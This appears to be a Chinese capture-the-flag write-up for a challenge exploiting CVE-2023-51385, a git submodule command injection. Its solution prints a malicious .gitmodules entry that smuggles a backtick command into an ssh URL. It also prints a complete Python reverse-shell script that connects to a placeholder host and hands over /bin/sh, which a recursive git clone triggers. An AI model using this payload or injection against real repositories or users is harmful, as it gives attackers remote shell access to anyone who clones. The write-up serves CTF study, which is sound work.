# modules

> 分类：Misc

## 题目描述

git 子模块命令执行漏洞，CVE-2023-51385。

## 考察知识点

- CVE-2023-51385（git 子模块路径命令注入）
- git clone --recurse-submodules

## 解法

CVE-2023-51385 利用。在 Gitee 上新建仓库包含恶意 `.gitmodules`：

```
[submodule "cve"]
	path = cve
	url = ssh://`python 1.py`foo.ichunqiu.com/bar
```

其中 `1.py` 是反弹 shell 脚本：

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("x.x.x.x",7777))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"]);
```

然后 `git clone -v <项目地址> --recurse-submodules` 触发命令执行反弹 shell。

## 参考答案

（flag 通过 CVE-2023-51385 命令执行后读取）

## 来源

- 作者：末 初 | https://blog.csdn.net/mochu7777777/article/details/135760457
- 作者：Lunatic | https://goodlunatic.github.io/posts/5de0d7e/
